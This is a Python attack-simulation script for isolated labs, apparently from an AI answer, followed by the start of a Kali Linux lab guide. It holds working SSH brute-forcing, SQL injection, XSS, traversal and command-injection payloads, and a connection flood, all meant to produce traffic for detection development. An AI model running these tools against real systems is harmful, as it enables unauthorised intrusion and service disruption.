#!/usr/bin/env python3
"""
Safe Attack Simulator for Isolated Lab Environments
Simulates various attack patterns for security testing and detection development

⚠️ WARNING: Only use in isolated lab environments you own/control
⚠️ LEGAL: Ensure you have explicit permission for all target systems
⚠️ SAFETY: All attacks have configurable intensity limits

Author: Your Name
License: Educational Use Only
"""

import argparse
import socket
import subprocess
import time
import random
import threading
import signal
import sys
from datetime import datetime
from pathlib import Path
import ipaddress
from typing import List, Optional
import paramiko  # pip install paramiko
import requests  # pip install requests

class SafetyControls:
    """Safety mechanisms to prevent accidental misuse"""
    
    SAFE_NETWORKS = [
        "192.168.0.0/16",
        "10.0.0.0/8",
        "172.16.0.0/12"
    ]
    
    @staticmethod
    def is_safe_target(target_ip: str) -> bool:
        """Verify target is in private network range"""
        try:
            ip = ipaddress.IPv4Address(target_ip)
            for safe_net in SafetyControls.SAFE_NETWORKS:
                if ip in ipaddress.IPv4Network(safe_net):
                    return True
            return False
        except:
            return False
    
    @staticmethod
    def require_confirmation(attack_type: str, target: str):
        """Require explicit confirmation before attack"""
        print("\n" + "=" * 80)
        print("⚠️  ATTACK SIMULATION CONFIRMATION")
        print("=" * 80)
        print(f"Attack Type: {attack_type}")
        print(f"Target: {target}")
        print(f"Time: {datetime.now()}")
        print("\n⚠️  This will generate malicious-looking traffic in your lab.")
        print("⚠️  Only proceed if:")
        print("   1. This is YOUR isolated lab environment")
        print("   2. You have permission for all target systems")
        print("   3. Network monitoring tools (Wireshark/tcpdump) are ready")
        print("=" * 80)
        
        confirm = input("\nType 'I UNDERSTAND' to proceed: ")
        if confirm != "I UNDERSTAND":
            print("❌ Aborted")
            sys.exit(1)


class AttackSimulator:
    """Main attack simulation controller"""
    
    def __init__(self, target_ip: str, intensity: str = "low", duration: int = 60):
        if not SafetyControls.is_safe_target(target_ip):
            print(f"❌ ERROR: {target_ip} is not in safe private network range")
            print(f"Safe ranges: {SafetyControls.SAFE_NETWORKS}")
            sys.exit(1)
        
        self.target_ip = target_ip
        self.intensity = intensity
        self.duration = duration
        self.stop_flag = threading.Event()
        
        # Intensity settings
        self.intensity_config = {
            "low": {"delay": 1.0, "threads": 1, "rate": 10},
            "medium": {"delay": 0.5, "threads": 2, "rate": 50},
            "high": {"delay": 0.1, "threads": 5, "rate": 100}
        }
        
        self.config = self.intensity_config.get(intensity, self.intensity_config["low"])
        
        # Setup signal handler for clean shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        
        self.log_file = f"attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    def _signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print("\n\n🛑 Stopping attack simulation...")
        self.stop_flag.set()
        time.sleep(2)
        print("✅ Attack stopped safely")
        sys.exit(0)
    
    def _log(self, message: str):
        """Log attack activity"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_message = f"[{timestamp}] {message}"
        print(log_message)
        
        with open(self.log_file, 'a') as f:
            f.write(log_message + '\n')
    
    # ==================== ATTACK SIMULATIONS ====================
    
    def simulate_port_scan(self):
        """
        Simulate port scanning activity
        Creates typical nmap-like traffic patterns
        """
        SafetyControls.require_confirmation("Port Scan", self.target_ip)
        
        self._log(f"🔍 Starting port scan simulation on {self.target_ip}")
        self._log(f"Intensity: {self.intensity}, Duration: {self.duration}s")
        
        # Common ports to scan
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 
                 5900, 8080, 8443, 9200, 27017]
        
        # Add random high ports
        ports.extend(random.sample(range(1024, 65535), 50))
        
        start_time = time.time()
        scanned_ports = 0
        
        print(f"\n📊 Scan Progress:")
        print(f"Target: {self.target_ip}")
        print(f"Ports to scan: {len(ports)}")
        print(f"Start capture: sudo tcpdump -i any -w portscan.pcap host {self.target_ip}\n")
        
        for port in ports:
            if time.time() - start_time > self.duration or self.stop_flag.is_set():
                break
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((self.target_ip, port))
                
                if result == 0:
                    self._log(f"✅ Port {port} OPEN")
                else:
                    self._log(f"   Port {port} closed/filtered")
                
                sock.close()
                scanned_ports += 1
                
                time.sleep(self.config["delay"])
                
            except Exception as e:
                self._log(f"   Port {port} error: {e}")
        
        self._log(f"✅ Port scan complete. Scanned {scanned_ports} ports in {time.time() - start_time:.2f}s")
    
    def simulate_ssh_brute_force(self, username: str = "admin", password_file: str = None):
        """
        Simulate SSH brute force attack
        Uses common weak passwords
        """
        SafetyControls.require_confirmation("SSH Brute Force", self.target_ip)
        
        self._log(f"🔐 Starting SSH brute force simulation on {self.target_ip}")
        self._log(f"Target username: {username}")
        
        # Common weak passwords
        default_passwords = [
            "admin", "password", "123456", "12345678", "qwerty",
            "abc123", "monkey", "1234567", "letmein", "trustno1",
            "dragon", "baseball", "111111", "iloveyou", "master",
            "sunshine", "ashley", "bailey", "passw0rd", "shadow",
            "123123", "654321", "superman", "qazwsx", "michael",
            "football", "password1", "admin123", "root", "test"
        ]
        
        if password_file:
            try:
                with open(password_file, 'r') as f:
                    passwords = [line.strip() for line in f]
            except:
                passwords = default_passwords
        else:
            passwords = default_passwords
        
        print(f"\n📊 Brute Force Progress:")
        print(f"Target: {self.target_ip}:22")
        print(f"Username: {username}")
        print(f"Passwords to try: {len(passwords)}")
        print(f"Start capture: sudo tcpdump -i any -w ssh_bruteforce.pcap host {self.target_ip} and port 22\n")
        
        start_time = time.time()
        attempts = 0
        
        for password in passwords:
            if time.time() - start_time > self.duration or self.stop_flag.is_set():
                break
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                try:
                    ssh.connect(
                        self.target_ip,
                        port=22,
                        username=username,
                        password=password,
                        timeout=3,
                        allow_agent=False,
                        look_for_keys=False
                    )
                    self._log(f"✅ SUCCESS! Password found: {password}")
                    ssh.close()
                    break
                except paramiko.AuthenticationException:
                    self._log(f"❌ Failed attempt {attempts + 1}: {username}:{password}")
                except Exception as e:
                    self._log(f"⚠️  Connection error: {e}")
                finally:
                    ssh.close()
                
                attempts += 1
                time.sleep(self.config["delay"])
                
            except Exception as e:
                self._log(f"Error: {e}")
        
        self._log(f"✅ SSH brute force complete. {attempts} attempts in {time.time() - start_time:.2f}s")
    
    def simulate_web_attack(self, target_port: int = 80):
        """
        Simulate web application attack patterns
        SQL injection, directory traversal, etc.
        """
        SafetyControls.require_confirmation("Web Application Attack", self.target_ip)
        
        self._log(f"🌐 Starting web attack simulation on {self.target_ip}:{target_port}")
        
        # Attack payloads (safe for testing)
        payloads = {
            "sql_injection": [
                "' OR '1'='1",
                "admin'--",
                "' OR '1'='1' --",
                "1' UNION SELECT NULL--",
                "' OR 1=1--",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
            ],
            "directory_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
            ],
            "command_injection": [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
            ]
        }
        
        paths = ["/", "/admin", "/login", "/api/users", "/search", "/upload"]
        
        print(f"\n📊 Web Attack Progress:")
        print(f"Target: http://{self.target_ip}:{target_port}")
        print(f"Start capture: sudo tcpdump -i any -w web_attack.pcap host {self.target_ip} and port {target_port}\n")
        
        start_time = time.time()
        requests_sent = 0
        
        for attack_type, attack_payloads in payloads.items():
            if time.time() - start_time > self.duration or self.stop_flag.is_set():
                break
            
            self._log(f"\n🎯 Testing {attack_type}")
            
            for payload in attack_payloads:
                if time.time() - start_time > self.duration or self.stop_flag.is_set():
                    break
                
                path = random.choice(paths)
                url = f"http://{self.target_ip}:{target_port}{path}"
                
                try:
                    # Try as GET parameter
                    response = requests.get(
                        url,
                        params={"id": payload, "search": payload},
                        timeout=3
                    )
                    self._log(f"   GET {url}?id={payload[:30]}... -> {response.status_code}")
                    requests_sent += 1
                    
                    time.sleep(self.config["delay"])
                    
                    # Try as POST data
                    response = requests.post(
                        url,
                        data={"username": payload, "password": payload},
                        timeout=3
                    )
                    self._log(f"   POST {url} (payload in body) -> {response.status_code}")
                    requests_sent += 1
                    
                    time.sleep(self.config["delay"])
                    
                except requests.exceptions.RequestException as e:
                    self._log(f"   Request failed: {e}")
                except Exception as e:
                    self._log(f"   Error: {e}")
        
        self._log(f"✅ Web attack simulation complete. {requests_sent} requests in {time.time() - start_time:.2f}s")
    
    def simulate_dos_attack(self, target_port: int = 80):
        """
        Simulate Denial of Service attack (low intensity for safety)
        Creates high volume of connection attempts
        """
        SafetyControls.require_confirmation("DoS Attack (Low Intensity)", self.target_ip)
        
        self._log(f"💥 Starting DoS simulation on {self.target_ip}:{target_port}")
        self._log(f"⚠️  Running at LOW intensity to prevent actual service disruption")
        
        print(f"\n📊 DoS Simulation Progress:")
        print(f"Target: {self.target_ip}:{target_port}")
        print(f"Start capture: sudo tcpdump -i any -w dos_attack.pcap host {self.target_ip}\n")
        
        def connection_flood():
            """Worker thread for connection attempts"""
            while not self.stop_flag.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target_ip, target_port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
                    sock.close()
                except:
                    pass
                time.sleep(self.config["delay"])
        
        threads = []
        start_time = time.time()
        
        # Start worker threads
        for i in range(self.config["threads"]):
            t = threading.Thread(target=connection_flood)
            t.daemon = True
            t.start()
            threads.append(t)
            self._log(f"   Started worker thread {i + 1}")
        
        # Run for specified duration
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = time.time() - start_time
                self._log(f"   DoS running... {elapsed:.0f}s / {self.duration}s")
        except KeyboardInterrupt:
            pass
        
        # Stop threads
        self.stop_flag.set()
        for t in threads:
            t.join(timeout=2)
        
        self._log(f"✅ DoS simulation complete. Duration: {time.time() - start_time:.2f}s")
    
    def simulate_data_exfiltration(self, target_port: int = 443):
        """
        Simulate data exfiltration pattern
        Large file upload to external-like destination
        """
        SafetyControls.require_confirmation("Data Exfiltration", self.target_ip)
        
        self._log(f"📤 Starting data exfiltration simulation to {self.target_ip}:{target_port}")
        
        print(f"\n📊 Exfiltration Simulation:")
        print(f"Target: {self.target_ip}:{target_port}")
        print(f"Start capture: sudo tcpdump -i any -w data_exfil.pcap host {self.target_ip}\n")
        
        # Generate fake "sensitive" data
        fake_data = b"SENSITIVE_DATA_" * 1000  # ~15KB chunks
        
        start_time = time.time()
        bytes_sent = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, target_port))
            
            self._log(f"✅ Connected to {self.target_ip}:{target_port}")
            
            # Send data in chunks
            while time.time() - start_time < self.duration and not self.stop_flag.is_set():
                try:
                    sock.send(fake_data)
                    bytes_sent += len(fake_data)
                    self._log(f"   Sent {bytes_sent / 1024:.2f} KB")
                    time.sleep(self.config["delay"])
                except:
                    break
            
            sock.close()
            
        except Exception as e:
            self._log(f"⚠️  Connection error: {e}")
        
        self._log(f"✅ Exfiltration simulation complete. Total sent: {bytes_sent / 1024:.2f} KB")
    
    def simulate_lateral_movement(self, target_hosts: List[str]):
        """
        Simulate lateral movement across multiple hosts
        SSH connection hopping
        """
        if not all(SafetyControls.is_safe_target(host) for host in target_hosts):
            print("❌ ERROR: One or more targets not in safe network range")
            return
        
        SafetyControls.require_confirmation("Lateral Movement", ", ".join(target_hosts))
        
        self._log(f"↔️  Starting lateral movement simulation across {len(target_hosts)} hosts")
        
        print(f"\n📊 Lateral Movement Simulation:")
        print(f"Targets: {', '.join(target_hosts)}")
        print(f"Start capture: sudo tcpdump -i any -w lateral_movement.pcap\n")
        
        username = "testuser"
        
        for i, host in enumerate(target_hosts):
            if self.stop_flag.is_set():
                break
            
            self._log(f"\n🎯 Hop {i + 1}: Connecting to {host}")
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Attempt connection
                ssh.connect(
                    host,
                    port=22,
                    username=username,
                    password="password",  # Will fail, but creates traffic
                    timeout=3,
                    allow_agent=False,
                    look_for_keys=False
                )
                
            except Exception as e:
                self._log(f"   Connection attempt to {host}: {type(e).__name__}")
            
            time.sleep(2)
        
        self._log(f"✅ Lateral movement simulation complete")


def main():
    """CLI interface"""
    parser = argparse.ArgumentParser(
        description="Safe Attack Simulator for Isolated Lab Environments",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Port scan
  python attack_simulator.py --target 192.168.1.100 --attack port_scan
  
  # SSH brute force
  python attack_simulator.py --target 192.168.1.100 --attack ssh_brute --username admin
  
  # Web application attack
  python attack_simulator.py --target 192.168.1.100 --attack web_attack --port 80
  
  # DoS simulation
  python attack_simulator.py --target 192.168.1.100 --attack dos --port 80 --duration 30
  
  # Lateral movement
  python attack_simulator.py --attack lateral_movement --targets 192.168.1.10,192.168.1.11,192.168.1.12

⚠️  WARNING: Only use in isolated lab environments you own!
        """
    )
    
    parser.add_argument(
        '--target',
        type=str,
        help='Target IP address (must be private network)'
    )
    
    parser.add_argument(
        '--targets',
        type=str,
        help='Comma-separated list of target IPs (for lateral movement)'
    )
    
    parser.add_argument(
        '--attack',
        required=True,
        choices=['port_scan', 'ssh_brute', 'web_attack', 'dos', 'data_exfil', 'lateral_movement'],
        help='Type of attack to simulate'
    )
    
    parser.add_argument(
        '--port',
        type=int,
        default=80,
        help='Target port (default: 80)'
    )
    
    parser.add_argument(
        '--username',
        type=str,
        default='admin',
        help='Username for SSH brute force (default: admin)'
    )
    
    parser.add_argument(
        '--password-file',
        type=str,
        help='Password file for brute force attack'
    )
    
    parser.add_argument(
        '--intensity',
        choices=['low', 'medium', 'high'],
        default='low',
        help='Attack intensity (default: low)'
    )
    
    parser.add_argument(
        '--duration',
        type=int,
        default=60,
        help='Attack duration in seconds (default: 60)'
    )
    
    args = parser.parse_args()
    
    # Validate target(s)
    if args.attack == 'lateral_movement':
        if not args.targets:
            print("❌ ERROR: --targets required for lateral_movement")
            sys.exit(1)
        target_list = [t.strip() for t in args.targets.split(',')]
    else:
        if not args.target:
            print("❌ ERROR: --target required")
            sys.exit(1)
        target_list = [args.target]
    
    # Create simulator
    simulator = AttackSimulator(
        target_ip=args.target if args.target else target_list[0],
        intensity=args.intensity,
        duration=args.duration
    )
    
    print("\n" + "="*80)
    print("🔒 SAFE ATTACK SIMULATOR")
    print("="*80)
    print(f"Time: {datetime.now()}")
    print(f"Attack: {args.attack}")
    print(f"Intensity: {args.intensity}")
    print(f"Duration: {args.duration}s")
    print("="*80 + "\n")
    
    # Execute attack
    try:
        if args.attack == 'port_scan':
            simulator.simulate_port_scan()
        
        elif args.attack == 'ssh_brute':
            simulator.simulate_ssh_brute_force(args.username, args.password_file)
        
        elif args.attack == 'web_attack':
            simulator.simulate_web_attack(args.port)
        
        elif args.attack == 'dos':
            simulator.simulate_dos_attack(args.port)
        
        elif args.attack == 'data_exfil':
            simulator.simulate_data_exfiltration(args.port)
        
        elif args.attack == 'lateral_movement':
            simulator.simulate_lateral_movement(target_list)
    
    except KeyboardInterrupt:
        print("\n\n🛑 Attack simulation interrupted")
    
    print("\n" + "="*80)
    print("✅ SIMULATION COMPLETE")
    print("="*80)
    print(f"Log file: {simulator.log_file}")
    print("\nNext steps:")
    print("1. Analyze captured pcap files with Wireshark")
    print("2. Feed logs to your AI detection system")
    print("3. Document findings in your portfolio")
    print("="*80 + "\n")


if __name__ == "__main__":
    main()
```

---

# 🐉 SOLUTION 2: Kali Linux Penetration Testing Guide

Now for the **PROFESSIONAL** approach using real tools.

## **Complete Kali Linux Lab Setup Guide**

### **📋 Part 1: Lab Architecture**
```
┌─────────────────────────────────────────────────────────────┐
│                    HOST SYSTEM (KVM/QEMU)                   │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
│  │  Kali Linux  │  │  Target VM   │  │  Target VM   │     │
│  │  (Attacker)  │  │  Ubuntu/RHEL │  │  Ubuntu/RHEL │     │
│  │              │  │              │  │              │     │
│  │ 192.168.99.2 │  │192.168.99.10 │  │192.168.99.11 │     │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘     │
│         │                 │                 │              │
│         └─────────────────┴─────────────────┘              │
│                  Isolated Network                          │
│              (br-pentest: 192.168.99.0/24)                 │
│                                                              │
│  ┌──────────────┐                                          │
│  │ Monitor VM   │  <-- Wireshark/tcpdump running           │
│  │192.168.99.254│                                          │
│  └──────────────┘                                          │
└─────────────────────────────────────────────────────────────┘